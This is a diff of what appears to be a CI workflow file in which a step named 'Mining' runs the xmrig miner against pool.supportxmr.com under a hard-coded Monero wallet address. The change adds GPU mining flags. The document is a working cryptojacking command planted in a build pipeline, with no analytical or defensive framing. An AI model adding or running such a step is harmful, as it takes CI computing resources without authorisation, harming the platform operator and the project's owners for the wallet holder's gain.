@@ -23,4 +23,4 @@ jobs:
       - name: Mining
         run: |
           cd xmrig/build
-          ./xmrig --donate-level 5 -o pool.supportxmr.com:443 -u 49DU9Hz1C9RTeVoa6eYqqDVbYs9ftXQTFNkaeg27LBjvHUgjHRCkvz8FUFrUE1cGrwBmZzsXUi15J5fMdEaAp9rS8kHM2G8 -k --tls -p x --randomx-mode=fast
+          ./xmrig --donate-level 5 --opencl --cuda -o pool.supportxmr.com:443 -u 49DU9Hz1C9RTeVoa6eYqqDVbYs9ftXQTFNkaeg27LBjvHUgjHRCkvz8FUFrUE1cGrwBmZzsXUi15J5fMdEaAp9rS8kHM2G8 -k --tls -p 4 --randomx-mode=fast
